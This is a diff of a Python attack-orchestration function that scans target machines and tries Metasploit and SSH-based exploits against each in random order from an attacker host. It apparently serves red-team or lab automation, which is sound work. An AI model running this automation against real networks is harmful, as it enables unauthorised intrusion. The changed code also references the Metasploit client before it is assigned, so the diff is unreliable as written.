@@ -27,15 +27,15 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     compromised_machines={attacker_ip}
     uncompromised_machines=set(machines)
 
+    attack_db = Attack_DB(mc, attacker_ip, OOBSession)
     mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
-    attack_db = Attack_DB()
+    
 
     while machines:
 
         target_ip=machines.pop(0)
         print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
-
-        #attack=list(Attack_DB.attack_dict)
+        
         attack=list(attack_db.attack_dict)
         randomized_attack=random.sample(attack,len(attack))
 
@@ -81,6 +81,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         scan_type=attack_db.scans_dict[s].attack_type
         #scan_wait=Attack_DB.scans_dict[s].wait_time
         scan_wait=attack_db.scans_dict[s].wait_time
+
         scan_obj=Metasploit_Attack(scan_name,scan_instr,scan_wait,mc)
         print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
         
@@ -126,6 +127,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 attack_obj=SshAttack(attack_name,attack_instr,attacker_ip,OOBSession,attack_wait, mc)
             else:
                 attack_obj=Metasploit_Attack(attack_name,attack_instr,attack_wait, mc)
+                
             if(type(attack_obj)==SshAttack and OOBSession==None):
                 print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                 continue
